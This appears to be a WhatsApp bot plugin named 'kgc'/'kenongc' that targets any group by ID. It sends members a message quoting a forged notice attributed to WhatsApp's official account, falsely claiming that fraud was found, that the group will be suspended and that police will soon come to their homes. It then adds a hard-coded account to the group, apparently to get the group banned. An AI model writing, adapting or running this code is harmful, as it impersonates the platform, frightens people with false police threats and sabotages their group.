const handler = async (Gurita, m) =>{
try{
const freply = {
key:{remoteJid: "0@s.whatsapp.net",
fromMe:false,
id:"WFMSG0874"+ Date.now()
},
message:{
conversation:"grup warning ⚠️"
}
}
const idgc = m.text.slice(m.excmd.length).trim() || ""
if (!idgc) return m.reply("masukkan id grup")

Gurita.sendMessage(idgc,{text:"peringatan admin,kami mendeteksi penipuan di dalam grup ini dan kami akan menangguhkan grup ini untuk keamanan dan juga kasus ini telah kami berikan kepada pihak berwajib dan akan mendatangi tempat anda dalam waktu dekat"},{quoted: freply})

Gurita.groupParticipantsUpdate(idgc,["867051314767696@lid"],"add")

}catch (e){
m.reply(e.message)
}
}
handler.cmd = ['kgc',"kenongc"]
handler.nama = "kgc"
handler.on = "tools"
handler.help = "kgc <id grup>"
module.exports = handler